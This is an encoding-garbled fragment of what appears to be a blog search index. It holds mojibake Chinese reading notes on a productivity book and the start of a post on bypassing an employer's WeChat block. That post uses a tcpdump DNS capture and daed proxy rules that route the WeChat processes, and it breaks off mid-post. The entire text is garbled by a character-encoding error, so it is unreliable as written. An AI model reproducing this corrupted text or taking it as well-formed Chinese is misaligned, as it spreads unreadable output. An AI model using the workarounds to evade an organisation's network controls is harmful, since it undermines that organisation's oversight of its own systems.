·æŒ‘æˆ˜çš„äºº, ä¸ä»–ä»¬å…±åº¦æ—¶å…‰, å¬å¬ä»–ä»¬çš„æ•…äº‹, æ²‰æµ¸åœ¨æˆåŠŸçš„æ›¿ä»£ç»éªŒ, å°±èƒ½ç»™è‡ªå·±å¸¦æ¥å¼ºçƒˆæš—ç¤º: å¦‚æœä»–ä»¬åŠå¾—åˆ°, ä½ ä¹Ÿå¯ä»¥\nä»åšä¸­å­¦, åšçš„è¶Šå¤š, è‡ªä¿¡å¿ƒè¶Šå¼º\næ—¶åˆ»ä¿æœ‰åˆå­¦è€…å¿ƒæ€, ä¸è¦è¢«è¿‡å»çš„ç»éªŒæ‰€æŸç¼š, ç”¨å¼€æ”¾çš„å¿ƒæ€æ€è€ƒæé™å’Œé”™è¯¯. æé†’è‡ªå·±\u0026quot;å¤§å¸ˆ\u0026quot;ä¼šå—é™äºä»–ä»¬çš„ç†å¿µ, å‰æ–¹ä¾æ—§æœ‰æ— é™çš„å¯èƒ½\næ‰®æ¼”è€å¸ˆçš„è§’è‰², æŒ‡å¯¼åˆ«äººçš„åŒæ—¶å¯ä»¥è¿«ä½¿è‡ªå·±æ·±å…¥æ€è€ƒé—®é¢˜\nå½“äººä»¬æ„Ÿåˆ°å¯¹è‡ªå·±çš„è¡Œä¸ºå…·å¤‡æ‰€æœ‰æƒæ—¶, ä»–ä»¬å°±æ›´æœ‰å¯èƒ½å—åˆ°å†…åœ¨åŠ¨æœºçš„é©±ä½¿è€ŒæŠ•èº«å…¶ä¸­.\nå½“äººä»¬å¹¶ä¸è§‰å¾—è‡ªå·±å®Œå…¨ä¸»å¯¼ä¸€é¡¹ä»»åŠ¡, ä¾‹å¦‚ä»…ä»…åªæ˜¯ä¸ºäº†è·å–å¤–éƒ¨å¥–åŠ±ä»äº‹ä»»åŠ¡, é‚£ä¹ˆå¯¹è‡ªæˆ‘çš„æŒæ§æ„Ÿå°±ä¼šä¸‹é™, åŠ¨æœºä¹Ÿè·Ÿç€é™ä½. å…¶ä»–çš„ä¾‹å­å¦‚: æˆ‘ä¸å–œæ¬¢æˆ‘ä½çš„åœ°æ–¹, ä½†æˆ‘æ²¡æœ‰èƒ½åŠ›æ¬èµ°;æˆ‘ä¸å–œæ¬¢è¿™æ®µå…³ç³»,ä½†æˆ‘æ— åŠ›æ”¹å˜;æˆ‘è§‰å¾—å·¥ä½œæ— èŠ,ä½†æˆ‘æ²¡æœ‰èƒ½åŠ›æ”¹å˜.\næœ‰æ—¶çš„ç¡®æ— æ³•æ”¹å˜ç°çŠ¶, ä½†æ˜¯å¾ˆå¤šæ—¶å€™, äººæ¯”è‡ªå·±æ„è¯†åˆ°çš„æ›´æœ‰èƒ½åŠ›, è‡³å°‘èƒ½å¤ŸæŒæ§éƒ¨åˆ†å±€åŠ¿.å› æ­¤å¯ä»¥å¤šæé†’æé†’è‡ªå·±, å»å…³æ³¨è‡ªå·±èƒ½å¤Ÿæ§åˆ¶çš„éƒ¨åˆ†, å³ä¾¿ä¸èƒ½é€‰æ‹©åšä»€ä¹ˆ, ä»ç„¶å¯ä»¥é€‰æ‹©å¦‚ä½•åš.\nå½“æ— æ³•é€‰æ‹©æ—¶, å‘Šè¯‰è‡ªå·±: \u0026ldquo;æˆ‘é€‰æ‹©åšè¿™ä»¶äº‹\u0026rdquo;, \u0026ldquo;æˆ‘è·å¾—èµ„æ ¼åšè¿™ä»¶äº‹\u0026rdquo;, \u0026ldquo;æˆ‘æœ‰å¹¸è¿™ä¹ˆåš\u0026rdquo;\nä½ å¯ä»¥ä»ä¸€ä¸ªäººèº«ä¸Šå¤ºèµ°ä¸€åˆ‡, é™¤äº†ä¸€æ ·ä¸œè¥¿. é‚£æ˜¯äººç±»æœ€åçš„è‡ªç”±, ä¹Ÿå°±æ˜¯åœ¨ä»»ä½•æƒ…å½¢ä¸‹, é€‰æ‹©è‡ªå·±çš„å¿ƒæ€, é€‰æ‹©è‡ªå·±ä¸ªäººçš„æ–¹å¼.\næŒæ§å…³ç³»èƒ½é‡ ä¸ä¼˜ç§€çš„äººäº’åŠ¨å¯ä»¥æŒ¯å¥‹ç²¾ç¥\nå°†ç«äº‰è½¬åŒ–ä¸ºåŒè¢å…³ç³», å¹¶ä¸”å›¢é˜Ÿåˆä½œä¸ä»…æ˜¯ä¸€ç§è¡Œä¸ºæ–¹å¼, æ›´æ˜¯ä¸€ç§å¯ä»¥è‡ªæˆ‘æš—ç¤ºçš„å¿ƒæ€\nç›¸ä¿¡è‡ªå·±æ˜¯æŸä¸ªå›¢é˜Ÿçš„ä¸€å‘˜, è¦æœ‰æ„è¯†çš„æŠŠä½ èº«è¾¹åŒæ ·åœ¨åŠªåŠ›çš„äººæƒ³æˆä½ å›¢é˜Ÿä¸­çš„ä¸€å‘˜, å¹¶æƒ³åŠæ³•å°†ç«äº‰å¿ƒç†è½¬å˜ä¸ºåŒèµ¢å¿ƒç†\nåŒæ­¥æ€§èƒ½å¤Ÿå¸¦æ¥å›¢é˜Ÿæ„Ÿ, æ¯”å¦‚å°½ç®¡åœ¨åšä¸åŒçš„äº‹æƒ…, ä½†ä¸ä»–äººä¸€èµ·å·¥ä½œå¯¹ä¸“æ³¨åŠ›æœ‰å¾ˆå¤§çš„å¸®åŠ©, ä¹Ÿå¸¦æ¥å¿«ä¹, å‰ææ˜¯æ¶ˆç­ç«äº‰å¿ƒç†.\nå¸®åŠ©ä»–äºº, æˆ–è€…å¯»æ±‚ä»–äººçš„å¸®åŠ©, åŒæ–¹å¿…å®šä¼šæœ‰äººäº§ç”Ÿè‰¯å¥½çš„æ„Ÿè§‰, å¤§è„‘ä¼šåˆ†æ³Œå‚¬äº§ç´ ç­‰å¸¦æ¥å¿«ä¹çš„æ¿€ç´ \nä»¥æ­£ç¡®çš„æ–¹å¼æå‡ºè¯·æ±‚, å°½é‡å½“é¢, é—´æ¥çš„æ–¹å¼ä¼šå¢åŠ éš¾åº¦ é¿å…ä½¿ç”¨æ¶ˆæè¨€è¾, ä¹Ÿé¿å…å°†è¯·æ±‚ä»–äººçš„å¸®åŠ©å˜æˆä¸€ç§äº¤æ˜“, å¼ºè°ƒä¸ºä»€ä¹ˆè¦å‘è¿™ä¸ªç‰¹å®šçš„äººæ±‚åŠ©çš„æ­£é¢ç†ç”± å¥½æ¶ˆæ¯è¦è¿‡åº¦æ²Ÿé€š, å¯¹äºå¦‚ä½•å›åº”ä»–äººçš„å¥½æ¶ˆæ¯, éœ€è¦æœ‰ä¸»åŠ¨çš„å»ºè®¾æ€§å›åº”, è¿™ä¼šè®©åŒæ–¹çš„å…³ç³»æ›´åŠ ç¨³å›º\nå¥½æ¶ˆæ¯: æˆ‘å·¥ä½œè¢«å½•å–äº† ä¸»åŠ¨å»ºè®¾æ€§å›åº”: å¤ªæ£’äº†, ä½ ä¸ºæ­¤ä»˜å‡ºäº†å¾ˆå¤šåŠªåŠ›, æˆ‘å°±çŸ¥é“ä½ ä¼šæˆåŠŸ è¢«åŠ¨å»ºè®¾å›åº”: ç‰›\nè§£é” ä¸‰ç§å…‹æœæ‹–å»¶ç—‡çš„æ–¹æ³•:\næ¿€åŠ±è‡ªå·±å»åš -\u0026gt; å¦‚ä½•è®©è‡ªå·±æƒ³åš ç”¨çºªå¾‹è®©è‡ªå·±æ— è®ºå¦‚ä½•éƒ½è¦åš -\u0026gt; å¦‚ä½•å…‹æœ å¼„æ¸…æ¥šè‡ªå·±çš„ç—›è‹¦, ç–é€šå®ƒ -\u0026gt; æ˜¯ä»€ä¹ˆé˜»ç¢äº†æˆ‘ å»ºç«‹ç¡®å®šäº‹é¡¹ ä¸ç¡®å®šæ€§ä¼šè®©äººæ„Ÿè§‰å¾ˆç³Ÿ, ä¸æƒ³å»é¢å¯¹, å°±å¥½åƒæ²¡äººæƒ³åœ¨å¤§é›¾å¤©éª‘è‡ªè¡Œè½¦ä¸€æ ·.\næ¢ç´¢ç›®æ ‡: å¯¹è®¡åˆ’çš„æ‰§ç€å¯èƒ½ä¼šæˆä¸ºé˜»ç¢, æä¸æ¸…æœ€ç»ˆçš„ç›®çš„æ˜¯ä»€ä¹ˆ. æ‰€ä»¥åœ¨åˆ¶è®¢è®¡åˆ’å‰å¤šé—®é—®è‡ªå·±è®¡åˆ’èƒŒåçš„ç›®çš„æ˜¯ä»€ä¹ˆ.\nè®¾ç½®é‡åŒ–ç›®æ ‡å¯èƒ½ä¼šé˜»ç¢ç”Ÿäº§åŠ›, å¦‚æœå¤ªæ‰§è‘—ä¸€ä¸ªç›®æ ‡, å°±ä¼šå¿½è§†è¿‡ç¨‹å¸¦æ¥çš„ä¹è¶£\næˆ‘åçˆ±çš„æ–¹æ³•ä»ä¸ä¼šç»‘å®šæŸä¸ªå¤–éƒ¨ç»“æœæˆ–è€…ç›®çš„, è€Œæ˜¯æ³¨é‡åœ¨é€šå¾€ç›®æ ‡çš„æ—…ç¨‹ä¸­, æˆ‘ä»¬å¿…é¡»æ„Ÿè§‰æ„‰æ‚¦:\nçŸ­æœŸ: çŸ­æœŸç›®æ ‡ç¡®ä¿ä¸“æ³¨äºçœ¼å‰éœ€è¦çš„æ­¥éª¤ è¾“å…¥ä¸ºæœ¬: å¼ºè°ƒè¿‡ç¨‹è€Œä¸æ˜¯æŠ½è±¡çš„æœ€ç»ˆç»“æœ, ä¾‹å¦‚: åœ¨æ”¾ä¸‹æ‰‹æœºçš„æƒ…å†µä¸‹å·¥ä½œè‹¥å¹²å°æ—¶ å¯æ§åˆ¶: ä¸“æ³¨äºæ§åˆ¶èŒƒå›´å†…çš„ç›®æ ‡, ä¹Ÿå°±æ˜¯ç›®æ ‡å…·å¤‡å¯è¡Œæ€§ æ¿€å‘æ´»åŠ›: å°†æ¸¸æˆç­‰å› ç´ åŠ å…¥åˆ°ç›®æ ‡ä¸­ æ°´æ™¶çƒæ³•: äº‹å…ˆåœ¨è„‘æµ·ä¸­é—®è‡ªå·±, æœªæ¥ä»€ä¹ˆåŸå› å¯èƒ½ä¼šé€ æˆæ‹–å»¶? èƒ½åšäº›ä»€ä¹ˆæ¥å‰Šå¼±è¿™äº›åŸå› ? å¯ä»¥è¯·è°æ¥ååŠ©è‡ªå·±å…‹æœæ‹–å»¶? ç°åœ¨å¯ä»¥é‡‡å–ä»€ä¹ˆæ´»åŠ¨æ¥å¸®åŠ©æœªæ¥çš„è‡ªå·±?\nå°†è‡ªå·±æƒ³è¦åŸ¹å…»çš„ä¹ æƒ¯èå…¥æ—¥å¸¸çš„å…¶ä»–ä¹ æƒ¯ä¸­, ä½¿ç”¨\u0026quot;å¦‚æœxå‘ç”Ÿ, é‚£ä¹ˆæˆ‘å°±åšy\u0026quot;æ¥æš—ç¤ºè‡ªå·± -\u0026gt; èµ·åºŠæ—¶ç»ƒä¹ å†¥æƒ³\næ‰“æ•£ææƒ§ ç¼ºä¹å¤©èµ‹å’Œçµæ„Ÿä¸ä¼šé˜»ç¢ä½ , ææƒ§æ‰ä¼š\nå°†è‡ªèº«çš„æ„Ÿå—ç”¨è¯­è¨€è¡¨è¾¾å‡ºæ¥, èƒ½å¤Ÿè®©ç†æ€§å‘æŒ¥ä½œç”¨, å¢å¼ºè‡ªæˆ‘æ„è¯†, å› æ­¤å¤šé—®é—®è‡ªå·±: æˆ‘åœ¨å®³æ€•ä»€ä¹ˆ?\næœ‰æ„è¯†åœ°å»æ‰è‡ªå·±èº«ä¸Šçš„è´Ÿé¢æ ‡ç­¾, æ¢ä¸Šæ­£é¢æ ‡ç­¾, æ”¹å˜æ ‡ç­¾å¾€å¾€èƒ½æ”¹å˜è¡Œä¸º\né¿å…å°†æŒ«æŠ˜çš„å½±å“æ‰©å¤§åŒ–, æé†’è‡ªå·±, è¿™äº›ç³Ÿç³•çš„å½±å“åœ¨æœªæ¥å¹¶ä¸é‡è¦\nå¯ä»¥é—®é—®è‡ªå·±ä¸‰ä¸ªé—®é¢˜:\nååˆ†é’Ÿåè¿™ä»¶äº‹é‡è¦å— åå‘¨åè¿™ä»¶äº‹é‡è¦å— åå¹´åè¿™ä»¶äº‹é‡è¦å— åœæ­¢èšç„¦åœ¨è‡ªå·±èº«ä¸Š, æ²¡é‚£ä¹ˆå¤šäººåœ¨ä¹ä½ , ä½ æ²¡æœ‰é‚£ä¹ˆé‡è¦\nè™è ä¾ æ•ˆåº”: æŠŠè‡ªå·±æƒ³è±¡æˆè¶…çº§è‹±é›„æˆ–è€…å…¶ä»–è§’è‰²æ—¶, èƒ½å¤Ÿå±•ç°å‡ºæ›´å¥½çš„è‡ªæˆ‘æ§åˆ¶åŠ›ä¸“æ³¨åŠ›ç”šè‡³çºªå¾‹\nè§£æ„æƒ¯æ€§ ç‰›é¡¿ç¬¬ä¸€å®šç†ä¹Ÿé€‚ç”¨äºæè¿°äººç±»è¡Œä¸º: å¼€å§‹è¡ŒåŠ¨æ‰€éœ€è¦çš„èƒ½é‡è¿œå¤§äºä¿æŒè¡ŒåŠ¨çš„èƒ½é‡\né˜»ç¢è¡ŒåŠ¨çš„æ‘©æ“¦åŠ›å°±å­˜åœ¨äºç¯å¢ƒä¹‹ä¸­, å› æ­¤éœ€è¦è°ƒæ•´ç¯å¢ƒä¸­çš„é¢„è®¾é¡¹, å°†é‡è¦çš„ä¸œè¥¿æ”¾åœ¨æ˜¾çœ¼çš„ä½ç½®, ä¿æŒç¯å¢ƒæ•´æ´, å…³é—­æ‰‹æœº\næƒ³ç€åªéœ€è¦åšäº”åˆ†é’Ÿå°±å¥½, ç­‰æ—¶é—´åˆ°äº†å†å†³å®šæ˜¯å¦ä¼‘æ¯\nå¤šé—®é—®è‡ªå·±, ä¸‹ä¸€æ­¥å…·ä½“çš„è¡ŒåŠ¨æ˜¯ä»€ä¹ˆ? ä¸ºè‡ªå·±æè¿°ä¸€ä¸ªæœ€å°å¯è¡Œè®¡åˆ’\nè¿½è¸ªè¿›åº¦, ç”¨é‡åŒ–çš„æ–¹å¼æ¿€åŠ±è‡ªå·±\næ‰¾ä¸€ä¸ªå¿—åŒé“åˆçš„ä¼™ä¼´ç›‘ç£è‡ªå·±\nè‡ªå·±æ²¡èƒ½åšåˆ°çš„æ—¶å€™, ä¸è¦ä¸“æ³¨äºå¤±è´¥, è¦åŸè°…è€Œä¸æ˜¯è‹›è´£è‡ªå·±, å¹¶ä¸ºè‡ªå·±åšåˆ°çš„å°å°èƒœåˆ©è€Œåº†ç¥\nç»­èˆª å€¦æ€ æ˜¯ä¸€ç§èŒä¸šç°è±¡, ç‰¹å¾æ˜¯: æ„Ÿè§‰èƒ½é‡è€—å°½æˆ–ç²¾ç–²åŠ›ç«­;ä¸å·¥ä½œçš„å¿ƒç†è·ç¦»æ‹‰å¤§,æˆ–å¯¹å·¥ä½œæ„Ÿåˆ°æ¶ˆæè´Ÿé¢æˆ–è€…æ„¤ä¸–å«‰ä¿—;ä»¥åŠåŒæ—¶ä¼´éšç€ä¸“ä¸šæ•ˆèƒ½é™ä½. æœ€é‡è¦çš„, å®ƒä¸å·¥ä½œæ—¶é—´é•¿çŸ­æ— å…³, è€Œæ˜¯ä¸å·¥ä½œçš„æ„Ÿå—æœ‰å…³.\nä¸‰ç§å¸¸è§çš„å€¦æ€ :\nç–²åŠ³å€¦æ€ : æ¥è‡ªè¿‡å¤šçš„å·¥ä½œ æ¶ˆè€—æ€§å€¦æ€ : æ¥è‡ªé”™è¯¯çš„ä¼‘æ¯æ–¹å¼ é”™ä½å€¦æ€ : å°†ç²¾åŠ›æŠ•å…¥åˆ°é”™è¯¯çš„åœ°æ–¹ æ›´çœåŠ›çš„æ´»æ³•: æ‹’ç»çäº‹, æŠµæŠ—åˆ†å¿ƒ, å¢åŠ ä¼‘æ¯æ—¶é—´\né¢‘ç¹è½¬æ¢æ³¨æ„åŠ›ä¼šäº§ç”Ÿå¤§é‡çš„ç²¾åŠ›å¼€é”€, å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•:\nè®©æ‰‹æœºå˜å¾—éš¾ç”¨æˆ–è€…éš”ç»æ‰‹æœº æ‘†è„±æ”¾å¼ƒå‹å¤±è´¥, å®‰æ…°è‡ªå·±å¯ä»¥é‡æ–°å¼€å§‹, èŠèƒœäºæ—  \u0026ldquo;æˆ‘å·²ç»æµªè´¹äº†5åˆ†é’Ÿ, ä¸å¦‚æŠŠæ¥ä¸‹æ¥çš„ä¸‰ä¸ªå°æ—¶éƒ½æµªè´¹äº†å§\u0026rdquo; \u0026ldquo;æˆ‘å°‘å­¦ä¹ äº†ä¸€å¤©, å¹²è„†æ”¾å¼ƒå­¦ä¹ å§\u0026rdquo; æœ‰äº›åˆ†å¿ƒèƒ½å¤Ÿå¸®åŠ©äººä»¬ä¼‘æ¯, ä¾‹å¦‚é™ªä¼´, æé†’äººä»¬ä¸ºå¿«ä¹æš‚åœç‰‡åˆ»\nä¸‰ç§ä¸ºè‡ªå·±å……ç”µçš„æ–¹æ³•:\nåˆ›æ„å‹çš„æ´»åŠ¨, å­¦ä¹ æ–°æŠ€èƒ½, ç”»ç”», è¿åŠ¨ç­‰ç­‰ æ•ˆèƒ½æ„Ÿ è‡ªä¸»æ€§ è§£æ”¾æ„Ÿ æ”¾æ¾æ„Ÿ æ‹¥æŠ±è‡ªç„¶ å¬è‡ªç„¶çš„å£°éŸ³ä¹Ÿæœ‰æ•ˆæœ æ”¾ç©ºå¿ƒçµ å°±æ˜¯æŠŠ\u0026quot;ä»€ä¹ˆéƒ½ä¸åš\u0026quot;çš„æ—¶é—´èå…¥ç”Ÿæ´», ä¾‹å¦‚åœ¨åšäº‹æƒ…çš„æ—¶å€™ä¸ç”¨è€³æœºå¬ä»»ä½•ä¸œè¥¿, ç»™å¤§è„‘å‡è´Ÿ å…è®¸è‡ªå·±æ”¾æ¾ä¸€å¤©, å¹¶åˆ»æ„è¿œç¦»ä»»ä½•äº‹æƒ…, ä»€ä¹ˆéƒ½ä¸è¦åš, ä»€ä¹ˆéƒ½ä¸è¦çœ‹, ä»€ä¹ˆéƒ½ä¸è¦å¬ ","permalink":"https://dragonbox.top/posts/read-feel-good-productivity/","summary":"\u003cp\u003eè¿™æœ¬ä¹¦ä¸»è¦è®¨è®ºäº†å¦‚ä½•åœ¨å·¥ä½œè¿‡ç¨‹ä¸­ä¿æŒæ„‰æ‚¦çš„å¿ƒæ€, è¿›è€Œæå‡å·¥ä½œæ•ˆç‡, ä¿æŠ¤ç²¾ç¥å¥åº·. ä½œè€…è®¤ä¸ºæ„‰æ‚¦å¿ƒæ€å¯ä»¥å¸®åŠ©å…‹æœç„¦è™‘å’Œè¿‡åº¦çš„å‹åŠ›, æˆåŠŸä¸ä¼šè®©ä½ æ„Ÿè§‰æ„‰æ‚¦, ä½†æ˜¯æ„Ÿè§‰æ„‰æ‚¦ä¼šä¸ºä½ å¸¦æ¥æˆåŠŸ.\u003c/p\u003e\n\u003cp\u003eæœ¬ä¹¦å†…å®¹åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†: æ¿€åŠ±(è®©å·¥ä½œæ›´æœ‰å…´è‡´) è§£é”(æ¶ˆé™¤é¢å¯¹å·¥ä½œæ—¶çš„è´Ÿé¢æƒ…ç»ª) ç»­èˆª(é€šè¿‡è‰¯å¥½çš„ä¹ æƒ¯å…‹æœå€¦æ€ æ„Ÿ)\u003c/p\u003e\n\u003ch2 id=\"æ¿€åŠ±\"\u003eæ¿€åŠ±\u003c/h2\u003e\n\u003ch3 id=\"æ¸¸æˆåŒ–æ€ç»´\"\u003eæ¸¸æˆåŒ–æ€ç»´\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eæœ‰è¶£çš„æ¸¸æˆåŒ–ä½“éªŒä¼šå¸¦æ¥æ„‰æ‚¦\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eé€‰æ‹©ä¸€ä¸ªæ¸¸æˆæ€§æ ¼, æ‰¾å‡ºæœ€èƒ½ä¸ä½ äº§ç”Ÿå…±é¸£çš„æ¸¸æˆçŠ¶æ€, å¹¶æœ‰æ„è¯†çš„æŠŠè‡ªå·±å½“ä½œè¿™ä¸ªè§’è‰²æ¥å¯¹å¾…å·¥ä½œ, ä»£å…¥ä¸€åœºå†’é™©\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eæ”¶è—å®¶ï¼šå–œæ¬¢æ”¶é›†å’Œæ•´ç†ç‰©å“ï¼Œå–œæ¬¢å¯»æ‰¾çç¨€æ¤ç‰©ã€æ‹å–æ¡£æ¡ˆé¦†æˆ–è½¦åº“ä¸­çš„çå®ç­‰æ´»åŠ¨ã€‚\u003c/li\u003e\n\u003cli\u003eç«äº‰è€…ï¼šå–œæ¬¢æ¸¸æˆå’Œä½“è‚²èµ›äº‹ï¼Œä»¥å…¨åŠ›ä»¥èµ´å’Œè·èƒœä¸ºä¹ã€‚\u003c/li\u003e\n\u003cli\u003eæ¢ç´¢è€…ï¼šå–œæ¬¢å¾’æ­¥æ—…è¡Œã€å…¬è·¯æ—…è¡Œå’Œå…¶ä»–æ¢ç´¢æ´»åŠ¨ï¼Œå–œæ¬¢è¡Œèµ°å’Œå‘ç°æ–°çš„åœ°æ–¹å’Œä»æœªè§è¿‡çš„äº‹ç‰©ã€‚\u003c/li\u003e\n\u003cli\u003eåˆ›é€ è€…ï¼šåœ¨åˆ›é€ ä¸­æ‰¾åˆ°å¿«ä¹ï¼Œæ¯å¤©å¯ä»¥èŠ±å‡ ä¸ªå°æ—¶æ¶‚é¸­ã€ç»˜ç”»ã€åˆ¶ä½œéŸ³ä¹ã€å›­è‰ºç­‰ã€‚\u003c/li\u003e\n\u003cli\u003eè®²æ•…äº‹çš„äººï¼šæƒ³è±¡åŠ›ä¸°å¯Œï¼Œèƒ½ç”¨è‡ªå·±çš„æƒ³è±¡åŠ›å–æ‚¦ä»–äººã€‚ä»–ä»¬å–œæ¬¢å†™ä½œã€èˆè¹ˆã€æˆå‰§å’Œè§’è‰²æ‰®æ¼”ã€‚\u003c/li\u003e\n\u003cli\u003eå°ä¸‘ï¼šåŠªåŠ›é€—äººå‘ç¬‘ï¼Œå¯èƒ½ä¼šé€šè¿‡å€’ç«‹ã€å³å…´è¡¨æ¼”æˆ–æ¶ä½œå‰§é€—ä½ å‘ç¬‘ã€‚\u003c/li\u003e\n\u003cli\u003eå¯¼æ¼”ï¼šå–œæ¬¢ç­–åˆ’ã€ç»„ç»‡å’Œé¢†å¯¼ä»–äººï¼Œèƒ½èƒœä»»å„ç§è§’è‰²å’Œæ´»åŠ¨ï¼Œä»å¯¼æ¼”èˆå°å‰§åˆ°ç®¡ç†å…¬å¸ï¼Œå†åˆ°å‚ä¸æ”¿æ²»æˆ–ç¤¾ä¼šè¿åŠ¨ã€‚\u003c/li\u003e\n\u003cli\u003eåŠ¨è§‰å‹ï¼š åœ¨æ‚æŠ€ã€ä½“æ“å’Œè‡ªç”±è·‘ç­‰ä½“è‚²æ´»åŠ¨ä¸­æ‰¾åˆ°ä¹è¶£ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå–„äºè¿ç”¨å¥½å¥‡çš„åŠ›é‡, å½“è¢«é—®åˆ°è®©äººå¥½å¥‡çš„é—®é¢˜çš„æ—¶å€™, å¤§è„‘ä¼šå¼€å§‹åˆ†æ³Œå¤šå·´èƒº, æ›´è®©äººä¸“æ³¨\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eå·¥ä½œæ—¶å€™å¤šé—®é—®è‡ªå·±é—®é¢˜\u003c/li\u003e\n\u003cli\u003eæ¯å¤©é™¤äº†æ—¥å¸¸ä»»åŠ¡ä¹‹å¤–ç»™è‡ªå·±å¢åŠ ä¸€ä¸ªè®©äººå¥½å¥‡çš„æ”¯çº¿ä»»åŠ¡: æ¢ç´¢æ–°çš„è½¯ä»¶ å­¦ä¹ æ–°çš„ç¼–ç¨‹è¯­è¨€ å­¦ä¹ æ–°çš„æ¨¡å‹, ç»™ç©å¿ƒåˆ›é€ ç©ºé—´\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå¤šé—®é—®è‡ªå·±, æ€ä¹ˆæ ·èƒ½è®©è¿™ä¸ªä»»åŠ¡å˜å¾—æ›´åŠ æœ‰è¶£? è¦æ›´åŠ ä¸“æ³¨äºä»»åŠ¡è¿‡ç¨‹å¸¦æ¥çš„ä¹è¶£, è€Œä¸æ˜¯ç»“æœ.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå‹åŠ›ä¼šé™ä½æ¸¸æˆçš„èƒ½åŠ›, ä¹Ÿä¼šé™ä½ç”Ÿäº§åŠ›, è¿™æ„å‘³ç€ä¸ºäº†æ¿€å‘ç©å¿ƒ, æˆ‘ä»¬ä¸åªéœ€è¦è¿½æ±‚å†’é™©å’Œå¯»æ‰¾ä¹è¶£, è¿˜éœ€è¦åŠªåŠ›åˆ›é€ ä¸€ä¸ªä½é£é™©èƒ½è®©äººæ”¾æ¾çš„ç¯å¢ƒ\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå­¦ä¹ é»‘æš—ä¹‹é­‚çš„æ€è·¯å»çœ‹å¾…å¤±è´¥, å°†å¤±è´¥çœ‹ä½œæ˜¯å†’é™©ä¸­ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†, æ˜¯å°è¯•æ–°äº‹ç‰©çš„å®éªŒ, æ˜¯æˆåŠŸè·¯ä¸Šçš„å¿…ç»ä¹‹è·¯, æ˜¯éšå½¢çš„è¿›æ­¥\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå¤šæé†’æé†’è‡ªå·±, ä¸è¦è¿‡äºä¸¥è‚ƒ, è€Œæ˜¯çœŸè¯šä»¥å¯¹\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eå¥½æ¯”ç©ä¸€åœºå¤§å¯Œç¿æ¸¸æˆ, æ— æ‰€è°“çš„å¿ƒæ€è‡ªç„¶æ— æ³•ç©å¥½, è¿‡äºä¸¥è‚ƒå¯¹å¾—å¤±æ–¤æ–¤è®¡è¾ƒåˆ™æ— è®ºè¿‡ç¨‹æ˜¯å¦é¡ºåˆ©éƒ½ä½“ä¼šä¸åˆ°ä¹è¶£, åªæœ‰çœŸè¯šå¯¹å¾…æ¸¸æˆ, å…¨å¿ƒæŠ•å…¥æ¯ä¸€ä¸ªè¿‡ç¨‹å´åˆä¸è®¡è¾ƒå¾—å¤±, æ‰èƒ½å¼€æ€€å¤§ç¬‘. (å¾ˆé‡è¦)\u003c/p\u003e\n\u003ch3 id=\"è‡ªæˆ‘èµ‹æƒ\"\u003eè‡ªæˆ‘èµ‹æƒ\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eè‡ªä¿¡å¿ƒä¼šç»™å·¥ä½œè¿‡ç¨‹å¸¦æ¥å¿«ä¹, è®©äººè¡¨ç°æ›´å¥½\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eå¯¹äºäººç±»çš„è¡¨ç°å’Œç¦ç¥‰è€Œè¨€, é‡è¦çš„ä¸åªæ˜¯æˆ‘ä»¬çš„èƒ½åŠ›, è€Œä½¿æˆ‘ä»¬å¯¹è‡ªèº«èƒ½åŠ›çš„æ„Ÿå—\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eè‡ªä¿¡å¹¶éä¸ç”Ÿä¿±æ¥, è€Œä½¿é€è¿‡å­¦ä¹ è·å¾—\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eä½ è¯´çš„è¯å¾€å¾€ä¼šæˆä¸ºä½ ç›¸ä¿¡çš„çœŸç†, å½“ä½ å¬åˆ°\u0026quot;ä½ èƒ½åŠåˆ°\u0026quot;, \u0026ldquo;å°±å¿«æˆåŠŸäº†\u0026quot;ç­‰å¾®å°é¼“åŠ±, å°±è¶³ä»¥å¯¹è‡ªä¿¡æ°´å¹³å‘ç”Ÿå½±å“, æ›´é‡è¦çš„æ˜¯, è‡ªå·±å¯ä»¥å‘è‡ªå·±ä¼ è¾¾æ­£é¢è®¯æ¯.\u003c/p\u003e","title":"ã€Šé«˜æ•ˆåŸåŠ›ã€‹è¯»ä¹¦ç¬”è®°"},{"content":"ç›®å‰å•ä½å®æ–½äº†å¾®ä¿¡å°é”,æœ¬æ–‡æ—¨åœ¨è®°å½•ç»•è¿‡å°é”çš„è¿‡ç¨‹.\né˜¶æ®µä¸€: æŠ“åŸŸå ä½¿ç”¨äº†tcpdumpæŠ“å–å„ä¸ªdnsè¯·æ±‚, æ¥è·å–éœ€è¦ä»£ç†çš„åŸŸååˆ—è¡¨\nsudo tcpdump -i any -n -s 0 port 53 ä½†æ˜¯æŠ“åˆ°åŸŸåååŠ å…¥daedçš„ä»£ç†åˆ—è¡¨ä¸­è¿˜æ˜¯æ— æ³•ç™»é™†,æ€€ç–‘æ˜¯æ²¡æŠ“å…¨.\né˜¶æ®µäºŒ: è¿›ç¨‹ä»£ç† æ—¢ç„¶æŠ“ä¸å…¨, é‚£ä¹ˆå°±å¯¹æ•´ä¸ªå¾®ä¿¡çš„è¿›ç¨‹è¿›è¡Œæµé‡ä»£ç†å§, åœ¨daedä¸­æ·»åŠ è§„åˆ™:\npname(WeChatAppEx) -\u0026gt; proxy pname(wechat) -\u0026gt; proxy è¿™ä¸‹ç™»é™†å’Œå‘æ–‡å­—æ¶ˆæ¯éƒ½æ­£å¸¸äº†, 